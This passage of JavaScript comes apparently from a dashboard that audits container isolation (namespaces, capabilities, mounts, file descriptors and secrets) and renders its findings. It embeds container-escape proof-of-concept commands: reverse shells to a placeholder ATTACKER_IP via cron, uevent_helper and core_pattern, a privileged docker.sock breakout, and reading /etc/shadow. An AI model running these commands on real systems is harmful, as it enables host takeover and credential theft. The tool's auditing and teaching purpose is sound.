                title: 'CAP_SYS_PTRACE Process Injection Escape',
                desc: 'Allows debugging and tracing other processes. If PID namespace is shared or host processes are accessible, an attacker can inject shellcode into a host process.',
                poc: '# 1. Find a running host process PID (e.g. systemd or sshd):\nps aux\n\n# 2. Inject shellcode or attach debugger (if gdb/strace is installed):\ngdb -p <HOST_PID>\n\n# 3. Call system() in host process memory to run reverse shell.'
            },
            'CAP_SYS_MODULE': {
                title: 'CAP_SYS_MODULE Kernel Module Injection Escape',
                desc: 'Allows loading and unloading arbitrary Linux Kernel Modules (LKM). Bypasses all container and system controls.',
                poc: '# 1. Write a malicious kernel module (reverse shell / rootkit)\n# 2. Compile and load it from inside the container:\ninsmod /tmp/rootkit.ko'
            },
            'CAP_DAC_OVERRIDE': {
                title: 'CAP_DAC_OVERRIDE Read/Write Host Files',
                desc: 'Bypasses file read, write, and execute permission checks. Allows reading or writing to any file inside the mount context.',
                poc: '# 1. Read files owned by other users regardless of permission settings:\ncat /etc/shadow'
            },
            'CAP_CHOWN': {
                title: 'CAP_CHOWN File Ownership Hijack',
                desc: 'Allows changing file owner and group. An attacker can change ownership of critical binaries or config files to escalate privileges.',
                poc: '# Change owner of shell binary or config files to your user:\nchown youruser /etc/passwd'
            },
            'docker.sock': {
                title: 'Docker Socket Exposure Escape',
                desc: 'Access to /var/run/docker.sock allows talking to the host Docker daemon. You can spawn a privileged container that mounts the host root directory.',
                poc: '# 1. Verify access to docker socket (install docker client or use curl):\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# 2. Run a breakout container that mounts host root / and enters host namespaces:\ndocker run -it --privileged --pid=host -v /:/host debian chroot /host /bin/bash'
            },
            'host_mount': {
                title: 'Host Path Mount Escape',
                desc: 'A sensitive path from the host is mounted inside the container. This allows the container to read or modify host files.',
                poc: '# 1. Write a reverse shell cron job to the host filesystem:\necho "* * * * * root bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /path/to/mount/etc/cron.d/breakout\n\n# 2. Wait for the host cron daemon to run the payload.'
            },
            'sys_mount': {
                title: 'Writeable /sys/kernel/uevent_helper Escape',
                desc: 'A writeable /sys mount allows registering a uevent_helper. When a device event is triggered, the kernel executes the uevent helper script outside the container.',
                poc: '# 1. Create a helper payload inside the container:\necho -e "#!/bin/sh\\n/bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /tmp/payload.sh\nchmod +x /tmp/payload.sh\n\n# 2. Write the host path of the script to uevent_helper:\necho "/var/lib/docker/overlay2/SOME_HASH/merged/tmp/payload.sh" > /sys/kernel/uevent_helper\n\n# 3. Trigger a device event to execute the payload on the host:\necho add > /sys/class/mem/null/uevent'
            },
            'proc_mount': {
                title: 'Writeable /proc/sys/kernel/core_pattern Escape',
                desc: 'A writeable host procfs mount allows modifying the core_pattern. When a process crashes, the kernel executes the core_pattern program outside the container.',
                poc: '# 1. Create crash payload script:\necho -e "#!/bin/sh\\n/bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /tmp/payload.sh\nchmod +x /tmp/payload.sh\n\n# 2. Write host path of the script to core_pattern:\necho "|/var/lib/docker/overlay2/SOME_HASH/merged/tmp/payload.sh" > /proc/sys/kernel/core_pattern\n\n# 3. Trigger a crash to execute the payload on the host:\nkill -11 0'
            }
        };

        function openPoC(key) {
            const poc = ESCAPE_POCS[key];
            if (!poc) return;
            
            document.getElementById('poc-modal-title').textContent = poc.title;
            document.getElementById('poc-modal-desc').textContent = poc.desc;
            document.getElementById('poc-modal-code').textContent = poc.poc;
            
            const copyBtn = document.getElementById('poc-copy-btn');
            copyBtn.textContent = 'Copy Command';
            copyBtn.disabled = false;
            
            document.getElementById('poc-modal').style.display = 'flex';
        }

        function closePoCModal() {
            document.getElementById('poc-modal').style.display = 'none';
        }

        function copyPoC() {
            const code = document.getElementById('poc-modal-code').textContent;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.getElementById('poc-copy-btn');
                btn.textContent = 'Copied!';
                setTimeout(() => {
                    btn.textContent = 'Copy Command';
                }, 2000);
            });
        }

        document.addEventListener('DOMContentLoaded', () => {
            loadContainers();
            
            // Tab switcher
            const tabButtons = document.querySelectorAll('.tab-btn');
            tabButtons.forEach(btn => {
                btn.addEventListener('click', () => {
                    const tabId = btn.getAttribute('data-tab');
                    
                    // Update active button
                    tabButtons.forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    
                    // Update active content
                    const contents = document.querySelectorAll('.tab-content');
                    contents.forEach(c => c.classList.remove('active'));
                    document.getElementById(tabId).classList.add('active');
                });
            });

            // Form Submit for PID audit
            const pidForm = document.getElementById('pid-form');
            pidForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const pid = document.getElementById('pid-input').value;
                if (pid) {
                    runAudit(pid);
                }
            });

            // Refresh List
            document.getElementById('refresh-btn').addEventListener('click', loadContainers);

            // Export buttons
            document.getElementById('export-json-btn').addEventListener('click', () => {
                if (currentReportData) {
                    window.location.href = '/api/audit/' + currentReportData.pid + '/json';
                }
            });

            document.getElementById('export-html-btn').addEventListener('click', () => {
                if (currentReportData) {
                    window.location.href = '/api/audit/' + currentReportData.pid + '/html';
                }
            });

            document.getElementById('export-pdf-btn').addEventListener('click', exportPDF);
        });

        // Fetch processes list
        async function loadContainers() {
            const listEl = document.getElementById('process-list');
            listEl.innerHTML = '<li class="empty-list-msg">Loading processes...</li>';
            
            try {
                const response = await fetch('/api/containers');
                if (!response.ok) throw new Error('API failed');
                
                const containers = await response.json();
                
                if (containers.length === 0) {
                    listEl.innerHTML = '<li class="empty-list-msg"><svg viewBox="0 0 24 24"><path d="M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2Z"/></svg><span>No isolated containers found on this host.</span><span style="font-size: 0.75rem; max-width: 200px;">Enter a PID manually at the top to audit host processes.</span></li>';
                    return;
                }
                
                listEl.innerHTML = '';
                containers.forEach(proc => {
                    const item = document.createElement('li');
                    item.className = 'process-item';
                    item.dataset.pid = proc.pid;
                    item.onclick = () => {
                        // Highlight active in list
                        document.querySelectorAll('.process-item').forEach(el => el.classList.remove('active'));
                        item.classList.add('active');
                        runAudit(proc.pid);
                    };
                    
                    item.innerHTML = '<div class="process-item-header"><span class="process-name">' + escapeHTML(proc.name) + '</span><span class="process-pid">PID ' + proc.pid + '</span></div><div class="process-cmdline">' + escapeHTML(proc.cmdline || '[No arguments]') + '</div><div class="process-ns"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg> MNT Inode: ' + proc.mount_inode + '</div>';
                    listEl.appendChild(item);
                });
                
            } catch (err) {
                listEl.innerHTML = '<li class="empty-list-msg" style="color:var(--color-danger)">Failed to load running processes. Ensure daemon privileges.</li>';
            }
        }

        // Run Audit on specific PID
        async function runAudit(pid) {
            // Show loading panel
            document.getElementById('welcome-screen').style.display = 'none';
            document.getElementById('report-wrapper').style.display = 'none';
            document.getElementById('error-screen').style.display = 'none';
            document.getElementById('loading-screen').style.display = 'flex';
            
            try {
                // Perform AJAX audit call
                const response = await fetch('/api/audit/' + pid);
                if (!response.ok) {
                    const errObj = await response.json();
                    throw new Error(errObj.error || 'Server returned ' + response.status);
                }
                
                const data = await response.json();
                currentReportData = data;
                
                // Populate Dashboard fields
                populateReport(data);
                
                // Switch Panels
                document.getElementById('loading-screen').style.display = 'none';
                document.getElementById('report-wrapper').style.display = 'flex';
                
            } catch (err) {
                document.getElementById('loading-screen').style.display = 'none';
                document.getElementById('error-message').textContent = err.message;
                document.getElementById('error-screen').style.display = 'flex';
            }
        }

        // Render data inside HTML dashboard fields
        function populateReport(report) {
            // 1. Title Meta
            document.getElementById('report-target-name').textContent = report.process_name;
            document.getElementById('report-target-pid').textContent = 'PID ' + report.pid;
            document.getElementById('report-target-cmdline').textContent = report.cmdline || '[No arguments / Kernel Thread]';
            
            // 2. Score indicators
            const score = report.overall_score;
            document.getElementById('score-value-num').textContent = score;
            
            const ring = document.getElementById('score-ring-fill');
            const gauge = document.getElementById('score-gauge-ring');
            const statusEl = document.getElementById('score-safety-status');
            
            // Stroke circumference = 2 * PI * r = 2 * 3.14159 * 65 = 408.4
            const offset = 408 - (score / 100) * 408;
            ring.style.strokeDashoffset = offset;
            
            // Set Color levels
            gauge.className = 'score-gauge';
            statusEl.className = 'score-status';
            
            if (score >= 80) {
                gauge.classList.add('high');
                statusEl.classList.add('high');
                statusEl.textContent = 'SECURE';
            } else if (score >= 50) {
                gauge.classList.add('medium');
                statusEl.classList.add('medium');
                statusEl.textContent = 'MEDIUM RISK';
            } else {
                gauge.classList.add('low');
                statusEl.classList.add('low');
                statusEl.textContent = 'HIGH RISK';
            }

            // Overview Tab values
            document.getElementById('metric-ns-score').textContent = report.namespaces ? report.namespaces.score : '0';
            const nsStatusEl = document.getElementById('metric-ns-status');
            if (report.namespaces && report.namespaces.score === 100) {
                nsStatusEl.className = 'metric-status success';
                nsStatusEl.textContent = 'Isolated';
            } else {
                nsStatusEl.className = 'metric-status danger';
                nsStatusEl.textContent = 'Shared';
            }

            // Cap count
            const highCapCount = report.capabilities && report.capabilities.high_risk_caps ? report.capabilities.high_risk_caps.length : 0;
            document.getElementById('metric-cap-count').textContent = highCapCount;
            const capStatusEl = document.getElementById('metric-cap-status');
            if (highCapCount === 0) {
                capStatusEl.className = 'metric-status success';
                capStatusEl.textContent = 'Safe';
            } else if (highCapCount < 3) {
                capStatusEl.className = 'metric-status warning';
                capStatusEl.textContent = 'Restricted';
            } else {
                capStatusEl.className = 'metric-status danger';
                capStatusEl.textContent = 'Elevated';
            }

            // User context
            const uid = report.security ? report.security.uid : -1;
            document.getElementById('metric-user-uid').textContent = 'UID ' + uid;
            const userStatusEl = document.getElementById('metric-user-status');
            if (uid === 0) {
                if (report.security && report.security.usern_ns_mapped) {
                    userStatusEl.className = 'metric-status success';
                    userStatusEl.textContent = 'Rootless';
                } else {
                    userStatusEl.className = 'metric-status danger';
                    userStatusEl.textContent = 'Host Root';
                }
            } else {
                userStatusEl.className = 'metric-status success';
                userStatusEl.textContent = 'Low-Priv';
            }

            // Total risks counts (Filesystem, FD, Mount risks)
            let totalRisks = 0;
            if (report.mounts && report.mounts.risks) totalRisks += report.mounts.risks.length;
            if (report.filesystem && report.filesystem.risks) totalRisks += report.filesystem.risks.length;
            if (report.security && report.security.risks) totalRisks += report.security.risks.length;
            
            document.getElementById('metric-risks-count').textContent = totalRisks;
            const risksStatusEl = document.getElementById('metric-risks-status');
            if (totalRisks === 0) {
                risksStatusEl.className = 'metric-status success';
                risksStatusEl.textContent = 'Clean';
            } else if (totalRisks < 4) {
                risksStatusEl.className = 'metric-status warning';
                risksStatusEl.textContent = 'Warning';
            } else {
                risksStatusEl.className = 'metric-status danger';
                risksStatusEl.textContent = 'Critical';
            }

            // 3. Remediation Actions
            const recsListEl = document.getElementById('overview-recs-list');
            recsListEl.innerHTML = '';
            
            const remediations = [];
            if (report.security && report.security.recommendations) remediations.push(...report.security.recommendations);
            if (report.mounts && report.mounts.recommendations) remediations.push(...report.mounts.recommendations);
            if (report.filesystem && report.filesystem.recommendations) remediations.push(...report.filesystem.recommendations);
            if (report.environment && report.environment.secrets && report.environment.secrets.length > 0) {
                remediations.push('Do not expose passwords, API keys, or security tokens in environment variables. Use secret stores or mount credentials securely as files.');
            }
            if (report.file_descriptors && report.file_descriptors.fds) {
                for (const fd of report.file_descriptors.fds) {
                    if (fd.is_high_risk && fd.type === 'Directory') {
                        remediations.push('Ensure file descriptors pointing to host directories are closed before spawning container processes (set O_CLOEXEC flag).');
                        break;
                    }
                }
            }

            if (remediations.length === 0) {
                recsListEl.innerHTML = '<div class="rec-item"><div class="rec-title">No recommendations. The process is fully hardened.</div></div>';
            } else {
                remediations.forEach((rec, idx) => {
                    const isCritical = rec.toLowerCase().includes('host mount') || rec.toLowerCase().includes('root user') || rec.toLowerCase().includes('capabilities');
                    const div = document.createElement('div');
                    div.className = 'rec-item' + (isCritical ? ' critical-rec' : '');
                    div.innerHTML = '<input type="checkbox" class="rec-checkbox" id="rec-check-' + idx + '"><div class="rec-details"><label class="rec-title" for="rec-check-' + idx + '">Recommendation #' + (idx+1) + '</label><span class="rec-text">' + escapeHTML(rec) + '</span></div>';
                    recsListEl.appendChild(div);
                });
            }

            // 4. Namespaces Tab
            document.getElementById('ns-score-badge').textContent = 'SCORE: ' + (report.namespaces ? report.namespaces.score : 0) + '/100';
            const nsListEl = document.getElementById('namespaces-list');
            nsListEl.innerHTML = '';
            if (report.namespaces && report.namespaces.namespaces) {
                report.namespaces.namespaces.forEach(ns => {
                    const card = document.createElement('div');
                    card.className = 'ns-card ' + (ns.is_shared_with_host ? 'shared' : 'isolated');
                    let pocBtn = '';
                    if (ns.is_shared_with_host && ESCAPE_POCS[ns.name]) {
                        pocBtn = '<button class="btn-audit" style="margin-top:0.5rem;padding:0.25rem 0.5rem;font-size:0.75rem;background-color:var(--color-danger-glow);border:1px solid rgba(239,68,68,0.3);color:var(--color-danger);" onclick="openPoC(\'' + ns.name + '\')">💡 Escape PoC</button>';
                    }
                    card.innerHTML = '<div class="ns-card-header"><span class="ns-card-name">' + escapeHTML(ns.name) + '</span><span class="risk-badge ' + (ns.is_shared_with_host ? ns.risk_level.toLowerCase() : 'info') + '">' + (ns.is_shared_with_host ? 'Shared' : 'Isolated') + '</span></div><div class="ns-inode-row"><span>Target Inode:</span><span class="ns-inode-val">' + ns.target_inode + '</span></div><div class="ns-inode-row"><span>Host Inode:</span><span class="ns-inode-val">' + ns.host_inode + '</span></div><p class="ns-card-desc">' + escapeHTML(ns.description) + '</p>' + pocBtn;
                    nsListEl.appendChild(card);
                });
            }

            // 5. Capabilities Tab
            document.getElementById('cap-score-badge').textContent = 'SCORE: ' + (report.capabilities ? report.capabilities.score : 0) + '/100';
            const riskCapsBody = document.getElementById('high-risk-caps-list');
            riskCapsBody.innerHTML = '';
            const riskCaps = report.capabilities ? report.capabilities.high_risk_caps : [];
            if (!riskCaps || riskCaps.length === 0) {
                riskCapsBody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text-secondary)">No sensitive/high-risk capabilities found in the effective capability set.</td></tr>';
            } else {
                riskCaps.forEach(cap => {
                    const tr = document.createElement('tr');
                    let capNameCell = escapeHTML(cap.name);
                    if (ESCAPE_POCS[cap.name]) {
                        capNameCell += ' <button onclick="openPoC(\'' + cap.name + '\')" style="background:transparent;border:none;color:var(--color-danger);cursor:pointer;font-size:0.7rem;font-weight:bold;margin-left:0.5rem;text-decoration:underline">🎓 Escape PoC</button>';
                    }
                    tr.innerHTML = '<td style="font-family:var(--font-mono);font-weight:600;color:#fff">' + capNameCell + '</td><td><span class="risk-badge ' + cap.risk_level.toLowerCase() + '">' + escapeHTML(cap.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(cap.description) + '</td>';
                    riskCapsBody.appendChild(tr);
                });
            }

            // Capability Sets
            const capSets = report.capabilities ? report.capabilities.sets : null;
            const effEl = document.getElementById('cap-effective-set');
            const bndEl = document.getElementById('cap-bounding-set');
            effEl.innerHTML = '';
            bndEl.innerHTML = '';

            const isHighRiskCap = (name) => riskCaps && riskCaps.some(c => c.name === name);

            if (capSets && capSets.effective && capSets.effective.length > 0) {
                capSets.effective.forEach(c => {
                    const tag = document.createElement('span');
                    tag.className = 'cap-tag' + (isHighRiskCap(c) ? ' high-risk-tag' : '');
                    tag.textContent = c;
                    effEl.appendChild(tag);
                });
            } else {
                effEl.innerHTML = '<span class="cap-tag">[None / Fully Dropped]</span>';
            }

            if (capSets && capSets.bounding && capSets.bounding.length > 0) {
                capSets.bounding.forEach(c => {
                    const tag = document.createElement('span');
                    tag.className = 'cap-tag' + (isHighRiskCap(c) ? ' high-risk-tag' : '');
                    tag.textContent = c;
                    bndEl.appendChild(tag);
                });
            } else {
                bndEl.innerHTML = '<span class="cap-tag">[None / Fully Dropped]</span>';
            }

            // 6. Mounts Tab
            document.getElementById('mounts-score-badge').textContent = 'SCORE: ' + (report.mounts ? report.mounts.score : 0) + '/100';
            const mountRisksBody = document.getElementById('mount-risks-list');
            mountRisksBody.innerHTML = '';
            
            const mountRisks = report.mounts ? report.mounts.risks : [];
            if (!mountRisks || mountRisks.length === 0) {
                mountRisksBody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-secondary)">No sensitive volume mounts or writeable kernel interface exposures detected.</td></tr>';
            } else {
                mountRisks.forEach(risk => {
                    const tr = document.createElement('tr');
                    let pocKey = '';
                    if (risk.mount_source.includes('docker.sock')) {
                        pocKey = 'docker.sock';
                    } else if (risk.mount_point.includes('/sys') && (risk.risk_level === 'High' || risk.risk_level === 'Critical')) {
                        pocKey = 'sys_mount';
                    } else if (risk.mount_point.includes('/proc') && (risk.risk_level === 'High' || risk.risk_level === 'Critical')) {
                        pocKey = 'proc_mount';
                    } else if (risk.risk_level === 'Critical' || risk.risk_level === 'High') {
                        pocKey = 'host_mount';
                    }
                    let mountPointCell = escapeHTML(risk.mount_point);
                    if (pocKey && ESCAPE_POCS[pocKey]) {
                        mountPointCell += ' <button onclick="openPoC(\'' + pocKey + '\')" style="background:transparent;border:none;color:var(--color-danger);cursor:pointer;font-size:0.7rem;font-weight:bold;margin-left:0.5rem;text-decoration:underline">🎓 Escape PoC</button>';
                    }
                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:#fff">' + mountPointCell + '</td><td style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary)">' + escapeHTML(risk.mount_source) + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(risk.fs_type) + '</td><td><span class="risk-badge ' + risk.risk_level.toLowerCase() + '">' + escapeHTML(risk.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(risk.description) + '</td>';
                    mountRisksBody.appendChild(tr);
                });
            }

            // Full mount points list
            const fullMountsBody = document.getElementById('full-mounts-list');
            fullMountsBody.innerHTML = '';
            const mounts = report.mounts ? report.mounts.mounts : [];
            if (mounts && mounts.length > 0) {
                mounts.forEach(m => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:var(--text-muted)">' + m.mount_id + '</td><td style="font-family:var(--font-mono);color:#fff;max-width:250px;overflow:hidden;text-overflow:ellipsis">' + escapeHTML(m.mount_point) + '</td><td style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary);max-width:250px;overflow:hidden;text-overflow:ellipsis">' + escapeHTML(m.mount_source) + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(m.fs_type) + '</td><td style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">' + (m.mount_options ? escapeHTML(m.mount_options.join(',')) : '') + '</td>';
                    fullMountsBody.appendChild(tr);
                });
            } else {
                fullMountsBody.innerHTML = '<tr><td colspan="5" style="text-align:center">No mounts found.</td></tr>';
            }

            // 7. Security Tab
            document.getElementById('sec-score-badge').textContent = 'SCORE: ' + (report.security ? report.security.score : 0) + '/100';
            if (report.security) {
                const sec = report.security;
                document.getElementById('sec-uid').textContent = sec.uid + ' (Effective EUID: ' + sec.euid + ')';
                document.getElementById('sec-euid').textContent = sec.euid === 0 ? '0 (Host Root Superuser)' : sec.euid + ' (Non-Root)';
                document.getElementById('sec-gid').textContent = sec.gid + ' (Real) / ' + sec.egid + ' (Effective)';
                document.getElementById('sec-lsm').textContent = sec.lsm_profile || 'Unconfined / Disabled';
                
                let seccompText = 'Disabled (Seccomp not active)';
                if (sec.seccomp_mode === 2) seccompText = 'Enabled (Filter mode - syscall restrictions active)';
                else if (sec.seccomp_mode === 1) seccompText = 'Enabled (Strict mode - read/write/exit/rt_sigreturn only)';
                document.getElementById('sec-seccomp').textContent = seccompText;
                
                document.getElementById('sec-nnp').textContent = sec.no_new_privs ? 'Enabled (NoNewPrivs active - prevents SUID privilege escalations)' : 'Disabled (Process can gain new privileges via SUID)';
                document.getElementById('sec-userns').textContent = sec.usern_ns_mapped ? 'Enabled (Virtual map - root in container is unprivileged on host)' : 'Disabled (Container shares host UID space - root in container is root on host)';
                
                document.getElementById('sec-cgroup-mem').textContent = sec.cgroup_memory_limit || 'Unknown / Unlimited';
                document.getElementById('sec-cgroup-pids').textContent = sec.cgroup_pids_limit || 'Unknown / Unlimited';
                document.getElementById('sec-init-name').textContent = sec.init_process_name || 'unknown';
            }

            // 8. Sockets & Network Tab
            const listeningPortsBody = document.getElementById('net-listening-ports');
            listeningPortsBody.innerHTML = '';
            
            const netResult = report.network;
            const listening = netResult ? netResult.listening_ports : [];
            const connections = netResult ? netResult.connections : [];

            if (!listening || listening.length === 0) {
                listeningPortsBody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-secondary)">No listening TCP/UDP ports detected inside this process network namespace.</td></tr>';
            } else {
                listening.forEach(port => {
                    const isExposed = port.local_ip === '0.0.0.0' || port.local_ip === '::';
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono);font-weight:600">' + port.proto.toUpperCase() + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(port.local_ip) + '</td><td style="font-family:var(--font-mono);font-weight:600;color:#fff">' + port.local_port + '</td><td><span class="risk-badge ' + (isExposed ? 'danger' : 'info') + '">' + (isExposed ? 'Exposed to network' : 'Local loopback only') + '</span></td>';
                    listeningPortsBody.appendChild(tr);
                });
            }

            // Connections
            const connBody = document.getElementById('net-connections-list');
            connBody.innerHTML = '';
            if (!connections || connections.length === 0) {
                connBody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-secondary)">No active network socket connections detected.</td></tr>';
            } else {
                connections.forEach(conn => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono)">' + conn.proto.toUpperCase() + '</td><td style="font-family:var(--font-mono);color:var(--text-secondary)">' + escapeHTML(conn.local_ip) + ':' + conn.local_port + '</td><td style="font-family:var(--font-mono);color:#fff">' + escapeHTML(conn.remote_ip) + ':' + conn.remote_port + '</td><td><span class="risk-badge info" style="font-size:0.65rem">' + escapeHTML(conn.state) + '</span></td>';
                    connBody.appendChild(tr);
                });
            }

            // 9. Filesystem & FDs Tab
            document.getElementById('fs-score-badge').textContent = 'SCORE: ' + (report.filesystem ? report.filesystem.score : 0) + '/100';
            const fsRisksBody = document.getElementById('fs-risks-list');
            fsRisksBody.innerHTML = '';
            const fsRisks = report.filesystem ? report.filesystem.risks : [];
            if (!fsRisks || fsRisks.length === 0) {
                fsRisksBody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text-secondary)">No SUID/SGID files, world-writeable directories or filesystem exposures discovered.</td></tr>';
            } else {
                fsRisks.forEach(risk => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:#fff">' + escapeHTML(risk.path) + '</td><td><span class="risk-badge ' + risk.risk_level.toLowerCase() + '">' + escapeHTML(risk.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(risk.description) + '</td>';
                    fsRisksBody.appendChild(tr);
                });
            }

            // FDs leak scan
            document.getElementById('fd-score-badge').textContent = 'SCORE: ' + (report.file_descriptors ? report.file_descriptors.score : 0) + '/100';
            const fdLeakBody = document.getElementById('fd-leak-list');
            fdLeakBody.innerHTML = '';
            const fds = report.file_descriptors ? report.file_descriptors.fds : [];
            if (!fds || fds.length === 0) {
                fdLeakBody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-secondary)">No open file descriptors could be read.</td></tr>';
            } else {
                fds.forEach(fd => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:var(--text-muted)">' + fd.fd + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(fd.type) + '</td><td style="font-family:var(--font-mono);color:#fff">' + escapeHTML(fd.target) + '</td><td><span class="risk-badge ' + (fd.is_high_risk ? 'danger' : 'info') + '">' + (fd.is_high_risk ? 'Dangerous Leak' : 'Safe') + '</span></td><td style="color:var(--text-secondary);font-size:0.8rem">' + escapeHTML(fd.description || 'Standard process file descriptor') + '</td>';
                    fdLeakBody.appendChild(tr);
                });
            }

            // 10. Secrets/Environment Tab
            document.getElementById('env-score-badge').textContent = 'SCORE: ' + (report.environment ? report.environment.score : 0) + '/100';
            const secretsBody = document.getElementById('env-secrets-list');
            secretsBody.innerHTML = '';
            const secrets = report.environment ? report.environment.secrets : [];
            if (!secrets || secrets.length === 0) {
                secretsBody.innerHTML = '<tr><td colspan="2" style="text-align:center;color:var(--text-secondary)">No sensitive credential patterns detected in active environment variables.</td></tr>';
            } else {
                secrets.forEach((sec, idx) => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td style="font-family:var(--font-mono);font-weight:600;color:#fff">' + escapeHTML(sec.key) + '</td><td><div class="secret-value-box"><span class="secret-value-text" id="sec-val-text-' + idx + '" data-val="' + escapeHTML(sec.value) + '">••••••••••••••••</span><button class="secret-mask-btn" onclick="toggleSecretMask(' + idx + ')">Show</button></div></td>';
                    secretsBody.appendChild(tr);
                });
            }
        }

        // Toggle environment variable hide/show masking
        function toggleSecretMask(idx) {
            const span = document.getElementById('sec-val-text-' + idx);
            const btn = span.nextElementSibling;
            
            if (span.textContent === '••••••••••••••••') {
                span.textContent = span.getAttribute('data-val');
                btn.textContent = 'Hide';
            } else {
                span.textContent = '••••••••••••••••';
                btn.textContent = 'Show';
            }
        }

        // Client side PDF generation using html2pdf.js
        function exportPDF() {
            if (!currentReportData) return;
            
            const btn = document.getElementById('export-pdf-btn');
            const originalText = btn.innerHTML;
            btn.innerHTML = 'Generating PDF...';
            btn.disabled = true;

            // Generate clean print template matching nspect styling
            const element = document.createElement('div');
            element.style.padding = '30px';
            element.style.color = '#1f2937';
            element.style.fontFamily = 'Arial, sans-serif';
            element.style.backgroundColor = '#ffffff';

            const formattedDate = new Date().toLocaleString();
            
            let nsRows = '';
            if (currentReportData.namespaces && currentReportData.namespaces.namespaces) {
                currentReportData.namespaces.namespaces.forEach(ns => {
                    nsRows += '<tr style="border-bottom:1px solid #e5e7eb"><td style="padding:8px;font-weight:bold;text-transform:uppercase">' + ns.name + '</td><td style="padding:8px">' + (ns.is_shared_with_host ? '<span style="color:#dc2626;font-weight:bold">SHARED</span>' : '<span style="color:#16a34a;font-weight:bold">ISOLATED</span>') + '</td><td style="padding:8px">' + ns.target_inode + '</td><td style="padding:8px;color:#4b5563;font-size:0.85rem">' + ns.description + '</td></tr>';
                });
            }

            let capRows = '';
            if (currentReportData.capabilities && currentReportData.capabilities.high_risk_caps) {
                currentReportData.capabilities.high_risk_caps.forEach(cap => {
                    capRows += '<tr style="border-bottom:1px solid #e5e7eb"><td style="padding:8px;font-family:monospace;font-weight:bold">' + cap.name + '</td><td style="padding:8px;color:#ea580c;font-weight:bold">' + cap.risk_level + '</td><td style="padding:8px;color:#4b5563;font-size:0.85rem">' + cap.description + '</td></tr>';
                });
            }
            if (capRows === '') {
                capRows = '<tr><td colspan="3" style="padding:8px;text-align:center;color:#6b7280">No high-risk capabilities active.</td></tr>';
            }

            let mountRows = '';
            if (currentReportData.mounts && currentReportData.mounts.risks) {
                currentReportData.mounts.risks.forEach(mr => {
                    mountRows += '<tr style="border-bottom:1px solid #e5e7eb"><td style="padding:8px;font-family:monospace;font-weight:bold">' + mr.mount_point + '</td><td style="padding:8px;font-family:monospace;font-size:0.75rem">' + mr.mount_source + '</td><td style="padding:8px;color:#dc2626;font-weight:bold">' + mr.risk_level + '</td><td style="padding:8px;color:#4b5563;font-size:0.85rem">' + mr.description + '</td></tr>';
                });
            }
            if (mountRows === '') {
                mountRows = '<tr><td colspan="4" style="padding:8px;text-align:center;color:#6b7280">No dangerous host filesystem mount points detected.</td></tr>';
            }

            let fsRows = '';
            if (currentReportData.filesystem && currentReportData.filesystem.risks) {
                currentReportData.filesystem.risks.forEach(fr => {
                    fsRows += '<tr style="border-bottom:1px solid #e5e7eb"><td style="padding:8px;font-family:monospace;font-weight:bold">' + fr.path + '</td><td style="padding:8px;color:#dc2626;font-weight:bold">' + fr.risk_level + '</td><td style="padding:8px;color:#4b5563;font-size:0.85rem">' + fr.description + '</td></tr>';
                });
            }
            if (fsRows === '') {
                fsRows = '<tr><td colspan="3" style="padding:8px;text-align:center;color:#6b7280">No insecure permissions or SUID files.</td></tr>';
            }

            let fdRows = '';
            if (currentReportData.file_descriptors && currentReportData.file_descriptors.fds) {
                currentReportData.file_descriptors.fds.forEach(fd => {
                    if (fd.is_high_risk) {
                        fdRows += '<tr style="border-bottom:1px solid #e5e7eb"><td style="padding:8px;font-family:monospace">' + fd.fd + '</td><td style="padding:8px;font-family:monospace">' + fd.type + '</td><td style="padding:8px;font-family:monospace">' + fd.target + '</td><td style="padding:8px;color:#4b5563;font-size:0.85rem">' + fd.description + '</td></tr>';
                    }
                });
            }
            if (fdRows === '') {
                fdRows = '<tr><td colspan="4" style="padding:8px;text-align:center;color:#6b7280">No open file descriptor leaks detected.</td></tr>';
            }

            let secRecs = '';
            const allRecs = [];
            if (currentReportData.security && currentReportData.security.recommendations) allRecs.push(...currentReportData.security.recommendations);
